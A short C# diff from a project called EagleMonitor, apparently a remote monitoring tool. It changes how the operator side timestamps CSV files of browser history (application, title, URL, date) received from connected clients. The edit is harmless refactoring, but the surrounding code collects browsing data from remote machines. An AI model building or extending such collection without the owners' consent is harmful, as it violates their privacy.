@@ -37,19 +37,19 @@ namespace EagleMonitor.PacketParser
                                 row.Cells["Column3"].Value = str[2].ToString();
                                 row.Cells["Column4"].Value = str[3].ToString();
                             }
-                            Miscellaneous.ToCSV(clientHandler.historyForm.dataGridView1, clientHandler.clientPath + "\\History\\" + DateTime.Now.ToString().Replace(":", "") + ".csv");
+                            Miscellaneous.ToCSV(clientHandler.historyForm.dataGridView1, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                             clientHandler.historyForm.loadingCircle1.Visible = false;
                             clientHandler.historyForm.loadingCircle1.Active = false;
                             historyPacket = null;
                         }));
                     }
                     else
-                    { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + DateTime.Now.ToString().Replace(":", "") + ".csv", new string[] { "Application", "Title", "URL", "Date" }); }
+                    { Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date" }); }
                     return;
                 }
                 catch
                 {
-                    Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + DateTime.Now.ToString().Replace(":", "") + ".csv", new string[] { "Application", "Title", "URL", "Date" });
+                    Miscellaneous.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date" });
                 }
             }).Start();
         }
